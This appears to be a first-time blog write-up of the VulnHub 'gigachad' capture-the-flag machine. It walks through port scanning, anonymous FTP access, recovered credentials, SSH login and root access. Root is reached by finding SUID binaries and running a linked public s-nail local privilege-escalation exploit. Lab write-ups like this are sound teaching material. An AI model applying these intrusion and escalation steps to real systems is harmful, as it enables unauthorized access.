---
layout: post
title:  CTF-gigachad
date:   2021-06-30 20:15:52 -0600
categories: CTF
tags: Pentest
---
# CTF-gigachad
## Discovery
link: [vulnhub-GAGACHAD](https://www.vulnhub.com/entry/gigachad-1,657/)
The only information we have it's there is multiple flags.

## Discovery and Scanning
### netdiscover
Fast scan with netdiscover.
```
sudo netdiscover -r 192.168.0.0/16
```
```
_____________________________________________________________________________               
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname                     
---------------------------------------------------------------------------- 
192.168.0.19    08:00:27:d0:52:bc      1      42  PCS Systemtechnik GmbH
```
### nmap
```
sudo nmap -sV -p- 192.168.0.19
```
```
Nmap scan report for 192.168.0.19
Host is up (0.00010s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:D0:52:BC (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We have the port 21, 22 and 80 open and it\'s a debian machine.
### port 80
Let\'s to to http://192.168.0.19 and see what I can find.
With the inspector(F12) I found a key:
`A7F9B77C16A3AA80DAA4E378659226F628326A95 D82D10564866FD9B201941BCC6C94022196F8EE8`
#### Dirbuster
I run a dirbuster with a common wordlist.
`dirbuster -u http://192.168.0.19/ -l Wordlist-common.txt`
Oh... I found 500 directories, I stop the scan, it\'s useless

#### Hash
Is an SHA-1 hash:
a7f9b77c16a3aa80daa4e378659226f628326a95 = fuck you
D82D10564866FD9B201941BCC6C94022196F8EE8 = VIRGIN
Maybe it's a password or a user.

I got all what I need so I can go to the FTP part.

### port 21
`ftp 192.168.0.19`
bash: ftp : commande introuvable
oh, I use arch BTW (and I\'m french)
`sudo pacman -S inetutils`
Now we can play.
`ftp 192.168.0.19`
user: `anonymous`
password: `password`
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
I\'m in, let's see what we can have with `ls`.
```
-r-xr-xr-x    1 1000     1000          297 Feb 07 17:33 chadinfo
```
Good, I have to read it.
Download: `ftp>get chadinfo`
Read: `cat chadinfo`
```
PK
0
 HR���ƃchadinfoUT	�j `Zj `ux
                                  why yes,
#######################
username is chad
???????????????????????
password?
!!!!!!!!!!!!!!!!!!!!!!!
go to /drippinchad.png
PK
0
 HR���ƃ��chadinfoUT�j `ux
                         PKN�
```
User: `chad`
Password: in the image drippinchad.png
http://192.168.0.19/drippinchad.png
![](images/drippinchad.png)

I will use google image to see where is it.
It\'s `maiden's tower` it should be the password.
After multiples attempts the password is `maidenstower`

I\'m connected as chad:
we have the directory `ftp` with the `chadinfo`,
and also user.txt.
I download and read it. 
```
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

```
Nice, I think I\'m done with the ftp, I go to sleep I will continue tomorrow.

### Port 22
I\'m back.

I will try to connect to ssh with previous creds:
User: `chad`
Password: `maidenstower`

```
ssh chad@192.168.0.19
```
I\'m in!

I am in his home directory, I will display what's in:

`ls -la`
```
drwxr-xr-x 4 chad chad 4096 Jul 16 06:51 .
drwxr-xr-x 3 root root 4096 Feb  7 14:57 ..
dr-xr-xr-x 2 chad chad 4096 Feb  7 16:41 ftp
drwx------ 3 chad chad 4096 Jul 16 06:51 .gnupg
-r-x------ 1 chad chad 1805 Jan  3  2021 user.txt
```
.gnupg seem intresting 

I have the directory private-keys-v1.d, but it's empty.
## Vulnerability Assessment
### Find perms
[Hausec pentest-cheatsheep](https://hausec.com/pentesting-cheatsheet/)
Find Binaries that will execute as the owner:
`find / -perm -u=s -type f 2>/dev/null`
This is what I found:
```
/usr/lib/openssh/ssh-keysign
/usr/lib/s-nail/s-nail-privsep
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```
s-nail look instresting:
`s-nail -V
v14.8.6`
### Exploit
I found this on exploit database:
[S-nail < 14.8.16 - Local Privilege Escalation](https://www.exploit-db.com/exploits/47172)
14.8.6 = 14.8.60 or 14.8.06 ?
Let's try it.

`touch exploit.sh`
`vi exploit.sh`
Past this: [https://www.exploit-db.com/raw/47172](https://www.exploit-db.com/raw/47172)
Escape, :wq.
`chmod + x exploit.sh`
`./exploit.sh`
Result:
```
[-] Failed. Not vulnerable?
[.] Cleaning up...
[-] Failed
```
This is the only exploit on exploit database, what I did wrong?
I\'m trying to download the file in the chad machine but the terminal is so buggy.
I will use scp to give him the file.
`scp 47172.sh chad@192.168.0.19:/tmp/exploit.sh`
Type the password: `maidenstower`
I have to run is with bash because ./ don\'t work, and I have too much errors now. 
I think the machine is broken or maybe my shell, 
I have some errors and it\'s my first CTF with this machine.
I fixed it with this [here](https://stackoverflow.com/questions/27052587/xterm-new-unknown-terminal-type).
So let\'s run the script and fail again, so I spamed it and I\'m in!
![](images/exploit.png)
I will change my shell `/bin/bash`. 
I\'m roo so let's see what is in `/root/` directory.
```
# cat root.txt  
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```
Nice, the CTF is over, it was easy.
There is an image, I will download it:
Receiver machine: `nc -l -p 1234 > chad.png` 
Sender machine: `nc -w 192.168.0.16 < chad.png`


This is the end, I hope you liked it, it was my first writeup.
![](images/chad.png)


